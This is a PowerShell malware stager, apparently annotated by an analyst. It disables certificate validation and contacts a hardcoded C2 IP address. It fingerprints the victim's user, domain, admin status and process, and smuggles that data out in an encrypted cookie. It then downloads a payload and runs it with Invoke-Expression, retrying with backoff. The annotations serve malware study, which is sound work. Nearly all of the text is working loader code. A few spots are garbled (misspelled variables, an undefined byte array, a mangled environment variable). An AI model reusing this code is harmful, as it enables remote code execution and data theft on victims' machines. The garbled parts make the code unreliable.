# prevents server certificate verification which would block requests
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
# no host specified (the C2 was only identified by an IP address)
$webClientHost = ""
# all the IPs to download the malware payload from
$urlsArray = @("https://95.213.145.101")
$urlPath = "/wpaas/load.php/"
# pre-defined symmetric key used to secure communications
# if you could intercept requests to the server, you could decrypt them!
$encryptionKey = "qwp0r0wXGPOeyFtIdP6qDHZCynQmtPzP6xkC3xX9sAc="

# creates a cipher algorithm and gives strong settings
# an initialization vector is a sequence of bytes at the start
# of an encryption string that helps guarantee randomness
# kind of like a salt for a password in that it prevents guessing
function cipherAlgorithmManager($key, $initializationVector) {
    try {
        # prefer Rijndael, default to AES
        $cipherAlg = New-Object "System.Security.Cryptography.RijndaelManaged"
    } catch {
        $cipherAlg = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
    }

    # sets cipher to a block cipher (as opposed to a stream cipher)
    $cipherAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
    # pads with 0s (not the default setting)
    $cipherAlg.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    # sets the blocks of data to be 128 bytes each
    $cipherAlg.BlockSize = 128
    # sets the size of the key used to 256 bits (only one pre-defined symmetric key)
    $cipherAlg.KeySize = 256

    # if an initialization vector given, may as well use it
    if ($initializationVector) {
        # if it's a string decode it, otherwise assume it's a byte array already
        if ($initializationVector.getType().Name -eq "String") {
            $cipherAlga.IV = [System.Convert]::FromBase64String($initializationVector)
        }
        else {
            $cipherAlga.IV = $initializationVector
        }
    }

    # decode the key if it's a string
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $cipherAlg.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $cipherAlg.Key = $key
        }
    }

    return $cipherAlg
}

function encrypt($key, $data) {
    # data needs to be a byte stream before it can be encrypted
    $byteData = [System.Text.Encoding]::UTF8.GetBytes($data)
    $cipherAlg = cipherAlgorithmManager $key
    $encryptor = $cipherAlg.CreateEncryptor()
    # encrypt whole data
    $encryptedByteArray = $encryptor.TransformFinalBlock($b, 0, $byteData.Length)
    # add on the initialization vector (IV) for better security
    [byte[]] $fullEncryptedArray = $cipherAlg.IV + $encryptedByteArray
    # encode the encrypted data for transmission
    return [System.Convert]::ToBase64String($fullEncryptedArray)
}

function decrypt($key, $encryptedData) {
    # first decode (since we encoded the data last in the encrypt function)
    $decodedByteArray = [System.Convert]::FromBase64String($encryptedData)
    # initiaization vector is the first 16 bytes of the encrypted data
    $initializationVector = $decodedByteArray[0..15]
    $cipherAlg = cipherAlgorithmManager $key $initializationVector
    $decryptor = $cipherAlg.CreateDecryptor()
    # decrypt from 16th byte to avoid the initialization vector
    $decryptedByteArray = $decryptor.TransformFinalBlock($decodedByteArray, 16, $decodedByteArray.Length - 16)
    # convert into a byte array and back to trim null characters on either end
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($decryptedByteArray).Trim([char]0)))
}

# creates and modifies the victim's web client
# the user's data is being smuggled through a cookie header
function getWebClient($cookie) {
    $username = ""
    $password = ""
    $proxyUrl = ""
    $webClient = New-Object System.Net.WebClient;

    # if C2 specified with a domain and the powershell version allows header setting
    if ($webClientHost -and (($psversiontable.CLRVersion.Major -gt 2))) {
        # set the destination to the C2
        $webClient.Headers.Add("Host", $webClientHost)
    } elseif ($webClientHost) {
        # if powershell version outdated stick variables onto the script
        $script:payloadPath = "https://$($webClientHost)/wpaas/load.php/";
        $script:payloadLocation = "https://$($webClientHost)"
    }

    # add generic user agent and empty referer headers
    $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36")
    $webClient.Headers.Add("Referer", "")

    # if using a proxy set the credentials for it
    if ($proxyUrl) {
        # create an authentication object for the proxy
        $webClientUserPrincipal = New-Object System.Net.WebProxy($proxyUrl, $true);
        # if credentials given (not in this script)
        # it's likely the hacker just pastes credentials in and uses these for all victims
        if ($username -and $password) {
            # make a secure string password (gives security through encapsulation)
            $secureStringPassword = ConvertTo-SecureString $password -AsPlainText -Force;
            # create an object for the credentials (even more security)
            $secureCredentials = New-Object System.Management.Automation.PSCredential $username, $secureStringPassword;
            $webClientUserPrincipal.Credentials = $secureCredentials;
        } else {
            # otherwise use default credentials (whatever they are)
            $webClient.UseDefaultCredentials = $true;
        }

        $webClient.Proxy = $webClientUserPrincipal;
    } else {
        # have to use default credentials if none given
        $webClient.UseDefaultCredentials = $true;
        # use the default credentials for the proxy too
        $webClient.Proxy.Credentials = $webClient.Credentials;
    }

    # set the "cookie" to the Cookie header
    if ($cookie) {
        $webClient.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$cookie")
    }

    return $webClient
}

# fetches the payload from one of the C2 servers and executes it
function getAndExecutePayload($url, $urlPath) {
    $script:payloadPath = $url + $urlPath
    $script:payloadLocation = $url
    # get the current user principal and the current process' name
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $windowsUserPrincipal = New-Object System.Security.Principal.WindowsPrincipal($currentUser)
    $adminRole = [System.Security.Principal.WindowsBuiltInRole]::Administrator
    $procName = (Get-Process -id $pid).ProcessName

    # put an asterix after the username if the user is an admin
    # this could be fooled by a low-privilege user whose username ends with *
    if ($windowsUserPrincipal.IsInRole($adminRole)) {
        $isAdminIdentifier = "*" }
    else {
        $isAdminIdentifier = ""
    }

    # try to append the asterix (if it exists to the username)
    try {
        $userNameAdmin = ($currentUser).name + $isAdminIdentifier
    } catch {
        # if this (somehow) fails and the username is the computer's name use that
        if ($env:username -eq "$($env:computername)$") {
        } else {
            $userNameAdmin = $env:username
        }
    }

    # steal system information, possibly so the C2 can send a tailored payload
    $systemInfo = "$env:userdomain;$userNameAdmin;$env:computername;$envTongueROCESSOR_ARCHITECTURE;$pid;$procName;1"

    # attempt to encrypt the system information, send ERROR otherwise
    try {
        $cookie = encrypt -key $encryptionKey -data $systemInfo
    } catch {
        $cookie = "ERROR"
    }

    # send user info and get the encrypted payload sent by the C2
    $encryptedPayload = (getWebClient -Cookie $cookie).downloadstring($script:payloadPath)
    $decryptedPayload = decrypt -key $encryptionKey -encryptedData $encryptedPayload

    # if the payload sent has 'key' in it run the payload as a powershell script
    # this 'key' is likely a bot ID sent to the victim
    if ($decryptedPayload -like "*key*") {
        $decryptedPayload | Invoke-Expression
    }
}

# fetches each C2's payload
function getAndExecuteAllPayloads {
    foreach ($url in $urlsArray) {
        try {
            getAndExecutePayload $url $urlPath
        } catch {
            Write-Output $error[0]
        }
    }
}

# try 30 times, waiting twice as long on each attempt
# this means you would wait 3.22*10^10 seconds on the last attempt!
$limit = 30
$wait = 60
while ($true -and $limit -gt 0) {
    $limit -= 1;
    getAndExecuteAllPayloads
    Start-Sleep $wait
    $wait *= 2;
}
